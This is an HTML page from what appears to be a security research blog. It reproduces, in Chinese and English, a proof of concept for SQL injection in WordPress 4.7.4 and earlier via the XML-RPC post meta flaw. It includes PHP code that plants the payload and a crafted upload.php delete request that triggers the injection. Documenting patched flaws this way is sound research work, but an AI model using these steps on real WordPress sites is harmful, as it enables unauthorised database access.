@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Wordpress &lt;&#x3D; 4.7.4 XML-RPC API POST META 未校验漏洞一、漏洞简介二、漏洞影响三、复现过程中文版以作者身份登录到您的wordpress 上传图片 记住图像&#x2F;媒体的ID 创建帖子并将图像设置为特色图像（这将创建_thumbnail_id帖子元） 记住帖子ID">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Wordpress/Wordpress%20%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Wordpress%20_=%204.7.4%20XML-RPC%20API%20POST%20META%20%E6%9C%AA%E6%A0%A1%E9%AA%8C%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="Wordpress &lt;&#x3D; 4.7.4 XML-RPC API POST META 未校验漏洞一、漏洞简介二、漏洞影响三、复现过程中文版以作者身份登录到您的wordpress 上传图片 记住图像&#x2F;媒体的ID 创建帖子并将图像设置为特色图像（这将创建_thumbnail_id帖子元） 记住帖子ID">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-07-08T06:26:07.679Z">
+<meta property="article:modified_time" content="2021-04-21T01:23:46.000Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Wordpress/Wordpress 系统漏洞/Wordpress _= 4.7.4 XML-RPC API POST META 未校验漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Wordpress/Wordpress%20%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Wordpress%20_=%204.7.4%20XML-RPC%20API%20POST%20META%20%E6%9C%AA%E6%A0%A1%E9%AA%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:07.679Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Wordpress-lt-4-7-4-XML-RPC-API-POST-META-未校验漏洞"><a href="#Wordpress-lt-4-7-4-XML-RPC-API-POST-META-未校验漏洞" class="headerlink" title="Wordpress &lt;= 4.7.4 XML-RPC API POST META 未校验漏洞"></a>Wordpress &lt;= 4.7.4 XML-RPC API POST META 未校验漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="中文版"><a href="#中文版" class="headerlink" title="中文版"></a>中文版</h3><p>以作者身份登录到您的wordpress</p>
+<p>上传图片</p>
+<p>记住图像/媒体的ID</p>
+<p>创建帖子并将图像设置为特色图像（这将创建_thumbnail_id帖子元）</p>
+<p>记住帖子ID</p>
+<p>我们可以通过修改_thumbnail_id的值来编辑的值（6是帖子ID，5是图片/帖子ID）</p>
+<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><pre><code>$usr = &#39;author&#39;;
+$pwd = &#39;author&#39;;
+$xmlrpc = &#39;http://local.target/xmlrpc.php&#39;;
+$client = new IXR_Client($xmlrpc);
+$content = array(&quot;ID&quot; =&gt; 6, &#39;meta_input&#39; =&gt; array(&quot;_thumbnail_id&quot;=&gt;&quot;xxx&quot;));
+$res = $client-&gt;query(&#39;wp.editPost&#39;,0, $usr, $pwd, 6/*post_id*/, $content);
+</code></pre>
+<p>通过这段代码，我们在数据库中添加以下负载</p>
+<pre><code>5 %1$%s hello
+</code></pre>
+<p>执行SQL负载</p>
+<p>使用作者帐户登录管理面板，转到媒体，例如</p>
+<pre><code>http://0-sec.org/wp-admin/upload.php
+</code></pre>
+<p>通过_wpnonce参数可以直接进行sql注入</p>
+<pre><code>http://0-sec.org/wp-admin/upload.php?_wpnonce=daab7cfabf&amp;action=delete&amp;media%5B%5D=5%20%251%24%25s%20hello
+</code></pre>
+<p>其中5 %1$%s<br>hello的encode编码是5%20%251%24%25s%20hello这个请求将导致数据库执行以下查询（会有错误）</p>
+<pre><code>SELECT post_id FROM wp_postmeta WHERE meta_key = &#39;_thumbnail_id&#39; AND meta_value = &#39;5 _thumbnail_id&#39; hello&#39;
+</code></pre>
+<p>这证明了Wordpress中的sql漏洞，正如5%1$%s之后的前一个post值中提到的，hello就是我们的payload</p>
+<h3 id="英文原文"><a href="#英文原文" class="headerlink" title="英文原文"></a>英文原文</h3><p>In order to understand the writing here, you need to read the previous<br>explanation <a target="_blank" rel="noopener" href="https://medium.com/websec/wordpress-sqli-bbb2afcc8e94">https://medium.com/websec/wordpress-sqli-bbb2afcc8e94</a>. If<br>you got it, then we can jump to the part and solve the question e.g. how<br>to update / insert our sql payload into _thumbnail_id post meta.</p>
+<h4 id="PoC-start"><a href="#PoC-start" class="headerlink" title="PoC start"></a>PoC start</h4><ul>
+<li><p>  Login to your wordpress as author</p>
+</li>
+<li><p>  Upload image</p>
+</li>
+<li><p>  Remember ID of the image / media</p>
+</li>
+<li><p>Create post and set image as featured image (this creates<br>  _thumbnail_id post meta)</p>
+</li>
+<li><p>  Remember the post ID</p>
+</li>
+</ul>
+<h4 id="Wordpress-≤-4-7-4-XML-RPC"><a href="#Wordpress-≤-4-7-4-XML-RPC" class="headerlink" title="Wordpress ≤ 4.7.4 XML-RPC"></a>Wordpress ≤ 4.7.4 XML-RPC</h4><p>n case of appropriate wordpress version then we can use the third<br>vulnerability in this versions of wordpress<br><a target="_blank" rel="noopener" href="https://wordpress.org/news/2017/05/wordpress-4-7-5/">https://wordpress.org/news/2017/05/wordpress-4-7-5/</a> e.g.</p>
+<pre><code>Lack of capability checks for post meta data in the XML-RPC API.
+</code></pre>
+<p>This means that we can edit the value of _thumbnail_id with the<br>following code ( 6 is the post ID and 5 is image/post ID )</p>
+<pre><code>$usr = &#39;author&#39;;
+$pwd = &#39;author&#39;;
+$xmlrpc = &#39;http://local.target/xmlrpc.php&#39;;
+$client = new IXR_Client($xmlrpc);
+$content = array(&quot;ID&quot; =&gt; 6, &#39;meta_input&#39; =&gt; array(&quot;_thumbnail_id&quot;=&gt;&quot;5 %1$%s hello&quot;));
+$res = $client-&gt;query(&#39;wp.editPost&#39;,0, $usr, $pwd, 6/*post_id*/, $content);
+</code></pre>
+<p>and with this code we add the following payload in the DB 5 %1$%s hello</p>
+<h4 id="Wordpress-importer-plugin-—-any-version-of-wordpress"><a href="#Wordpress-importer-plugin-—-any-version-of-wordpress" class="headerlink" title="Wordpress importer plugin — any version of wordpress"></a>Wordpress importer plugin — any version of wordpress</h4><p>This is another approach for changing the _thumbnail_id value in the<br>database. If wordpress instance have enabled this plugin on it, then<br>simple export, change meta value and import will do the job.</p>
+<h4 id="Execute-the-SQL-payload"><a href="#Execute-the-SQL-payload" class="headerlink" title="Execute the SQL payload"></a>Execute the SQL payload</h4><p>Login to the administration panel with your author account, go to media<br>e.g. <a target="_blank" rel="noopener" href="http://local.target/wp-admin/upload.php">http://local.target/wp-admin/upload.php</a> , grab the _wpnonce<br>value and we are ready to prove our SQLi vulnerability. Issue the<br>following request towards your local instance:</p>
+<pre><code>local.target/wp-admin/upload.php?_wpnonce=daab7cfabf&amp;action=delete&amp;media%5B%5D=5%20%251%24%25s%20hello
+</code></pre>
+<p>where 5%20%251%24%25s%20hello is url encoded 5 %1$%s hello. This<br>request will result with execution of the following query against the DB<br>(will rise error of course):</p>
+<pre><code>SELECT post_id FROM wp_postmeta WHERE meta_key = &#39;_thumbnail_id&#39; AND meta_value = &#39;5 _thumbnail_id&#39; hello&#39;
+</code></pre>
+<p>This proves the SQLi vulnerability in the wordpress and as mention in<br>previous post value after 5 %1$%s e.g. hello is our payload</p>
+<h4 id="Is-this-vulnerability-dangerous"><a href="#Is-this-vulnerability-dangerous" class="headerlink" title="Is this vulnerability dangerous?"></a>Is this vulnerability dangerous?</h4><p>SQL injection itself is quite dangerous vulnerability, but sometimes<br>have its own limitations. Here at our case depending of the database<br>server configuration or mysql client used on PHP side could be fatal,<br>but in our case best case scenario would be blind sql injection. Sure,<br>we all know the trivial attack vector, but here we have 2 facts that go<br>against wordpress:</p>
+<p>meta value database column type e.g. size constraint</p>
+<p>media parameter could be POST parameter e.g. will have huge size</p>
+<p>This two facts guide us to the conclusion that even with blind sqli one<br>query would be enough to calculate some crucial DB cell value.</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Wordpress/Wordpress%20%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Wordpress%20_=%204.7.4%20XML-RPC%20API%20POST%20META%20%E6%9C%AA%E6%A0%A1%E9%AA%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qygl00m1y8v19nlr3151" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/Wordpress/Wordpress%20%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Wordpress%20_=%204.8.2%20POST%20META%20%E6%A0%A1%E9%AA%8C%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/Wordpress/Wordpress%20%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Wordpress%205.2.4%20cors%E8%B7%A8%E5%9F%9F%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
